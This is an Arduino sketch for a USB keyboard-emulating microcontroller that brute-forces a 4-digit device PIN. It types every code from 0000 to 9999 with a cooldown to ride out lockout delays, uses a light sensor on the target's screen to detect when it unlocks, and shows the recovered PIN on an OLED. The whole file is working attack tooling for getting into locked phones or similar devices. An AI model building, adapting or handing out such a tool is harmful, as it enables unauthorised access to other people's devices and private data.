#include <Arduino.h>
#include <Keyboard.h> 
#include <U8g2lib.h>

#define OLED_SCL 5
#define OLED_SDA 6
#define LED_PIN 17 //17 = rx led on the sparkfun pro micro
#define BUTTON_PIN 2
#define RESISTOR_INPUT A0
#define TOLERANCE 10  //if the sensorValue changes more than sensorHigh + tolerance then the screen has been changed  
#define COOLDOWN 5500 //the ms delay between the pin-code inputs 

//supported display list: https://github.com/olikraus/u8g2/wiki/u8g2setupcpp
U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, OLED_SCL, OLED_SDA, U8X8_PIN_NONE);

//if you already know a few digits you can type them in here as starting values  
//s1 being the first digit to be typed
int s1 = 0;
int s2 = 0;
int s3 = 0;
int s4 = 0; 

bool debug = false;
bool isPaused = false;



// --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

int sensorValue;
int sensorLow = 1023;
int sensorHigh = 0;

void printDebug() {
  String lightmax = "sensorHigh: " + (String)sensorHigh;	
  String aa = "Light value: " + (String)analogRead(RESISTOR_INPUT);
  u8g2.drawStr(0,50, lightmax.c_str());
  u8g2.drawStr(0,60, aa.c_str());
  Serial.println("Current light value: " + (String)analogRead(RESISTOR_INPUT));
}

void pause(String reason) {
  sensorValue = analogRead(RESISTOR_INPUT);
  u8g2.clearBuffer();
  if (debug)  printDebug();
  u8g2.drawStr(0,20, "Bruteforcing Paused");
  if(reason.length() >= 21) {   //21 = max string lenght on a 128 wide display (with a 6px wide font)
    String text1 = reason.substring(0,21);
    String text2 = reason.substring(21);
    u8g2.drawStr(0,40, text1.c_str());
    u8g2.drawStr(0,50, text2.c_str());
  } else {
    u8g2.drawStr(0,40, reason.c_str());
  }
  u8g2.sendBuffer();
  unsigned long currentMillis = millis();
  while (millis() < (currentMillis + 500)) {
    digitalWrite(LED_PIN, HIGH);
    delay(250);
    digitalWrite(LED_PIN, LOW);
    delay(250);
  }
  if(digitalRead(BUTTON_PIN) == LOW && isPaused) {
    isPaused = false;
    Serial.println("Button pressed -> Bruteforcing resumed");
  }
}

void calibrateSensor() {
  digitalWrite(LED_PIN, LOW);

  if(isPaused) {
    Serial.println("Bruteforcing paused -> calibrating sensor");
    pause("");
  }

  while(analogRead(RESISTOR_INPUT) <= 5 || analogRead(RESISTOR_INPUT) >= 1010) {
    Serial.println("Sensor Value: " + (String)analogRead(RESISTOR_INPUT) + " -> turn on the screen / check wiring");
    pause("Sensor: "+ (String)analogRead(RESISTOR_INPUT) + "            no screen check wiring");
  }
  // calibrate for the first six seconds after program runs
  Serial.println("Calibrating sensor");
  u8g2.clearBuffer();
  u8g2.drawStr(0,10, "Calibrating 6sec");
  u8g2.drawStr(0,60,"Press for debug");
  unsigned long currentMillis = millis();
  while (millis() < (currentMillis + 6000)) {
    if (digitalRead(BUTTON_PIN) == LOW){
      u8g2.clearBuffer();
      debug = true;
      u8g2.drawStr(0,10, "Calibrating 6sec");
      u8g2.drawStr(0,60, "Debug enabled");
      Serial.println("Debug enabled");
    }
    // record the maximum sensor value
    sensorValue = analogRead(RESISTOR_INPUT);
    if (sensorValue > sensorHigh) {
      sensorHigh = sensorValue;
    }
    // record the minimum sensor value
    if (sensorValue < sensorLow) {
      sensorLow = sensorValue;
    }
    u8g2.sendBuffer();
  }

  // turn the LED off, signaling the end of the calibration period
  digitalWrite(LED_PIN, HIGH);
  Serial.println("sensorHigh: " + (String)sensorHigh);
  Serial.println("sensorLow: " + (String)sensorLow);
  
}

bool checkIfUnlocked() {
  sensorValue = analogRead(RESISTOR_INPUT);

  //pause bruteforcing when screen is off
  if((sensorValue < sensorLow) || sensorValue <= 5) {
    Serial.println("Screen off -> Bruteforcing paused");
    while(sensorValue < sensorLow || sensorValue <= 5) {
      pause("Screen off");
    }
    Serial.println("Screen on -> Bruteforcing resumed");
  }

  //if sensorValue is more than sensorHigh + tolerance then it means that the screen has changed
  if(sensorValue > sensorHigh + TOLERANCE) {
    return true;
  } else {
    return false;
  }
  return false;
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_BUILTIN_TX,INPUT); //disable the tx led to avoid confusion
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  pinMode(LED_PIN,OUTPUT);
  u8g2.begin();
  u8g2.clearBuffer();					// clear the internal memory
  u8g2.setFont(u8g2_font_6x10_tf);	// choose a suitable font

  // Start Keyboard
  Keyboard.begin();
  delay(2000);

  calibrateSensor();
  
  while(!checkIfUnlocked()) {

    if(s4 == 10) {
      s4 = 0;
      s3++;
    }
    if(s3 == 10) {
      s3 = 0;
      s2++;
    }
    if(s2 == 10) {
      s2 = 0;
      s1++;
    }
    if(s1 == 10) {
      s1 = 0;
      Keyboard.end();
      break;
    }

    Keyboard.print(s1);
    Keyboard.print(s2);
    Keyboard.print(s3);
    Keyboard.print(s4);
    Serial.println("Current PIN: " + (String)s1 + (String)s2 + (String)s3 + (String)s4);
    u8g2.clearBuffer();
    String aa = "Current PIN: " + (String)s1 + (String)s2 + (String)s3 + (String)s4;
    u8g2.clearBuffer();
    u8g2.drawStr(0,20, aa.c_str());					
    s4++;

    digitalWrite(LED_PIN, LOW);
    delay(100);
    digitalWrite(LED_PIN, HIGH);
    unsigned long currentMillis = millis();
    while (millis() <= (currentMillis + COOLDOWN)) { //wait x ms for code to be checked by the device

      if (debug)  {
        printDebug();
      } 
      u8g2.sendBuffer();
      //interrupt button 
      if (digitalRead(BUTTON_PIN) == LOW){
        Serial.println("Button pressed -> Bruteforcing paused");
        isPaused = true;
      }
      while(digitalRead(BUTTON_PIN) == HIGH && isPaused){
        pause("Button pressed");
      }
    }
  }

  digitalWrite(LED_PIN, LOW);
  Serial.println("Current light value: " + (String)analogRead(RESISTOR_INPUT));
  Serial.println(" ");
  Serial.println("----Unlocked----");
  Serial.println("PIN: " + (String)s1 + (String)s2 + (String)s3 + (String)s4);
  Serial.println("------------");
  u8g2.clearBuffer();
  u8g2.drawStr(0,10, "----Unlocked----");
  String bb = "PIN: " + (String)s1 + (String)s2 + (String)s3 + (String)s4;
  String lightmax = "sensorHigh: " + (String)sensorHigh;	
  String lightcurrent = "sensorValue: " + (String)sensorValue;
  u8g2.drawStr(0,20, bb.c_str());
  u8g2.drawStr(0,40, lightcurrent.c_str());
  u8g2.drawStr(0,50, lightmax.c_str());
  u8g2.sendBuffer();

}

void loop() {
}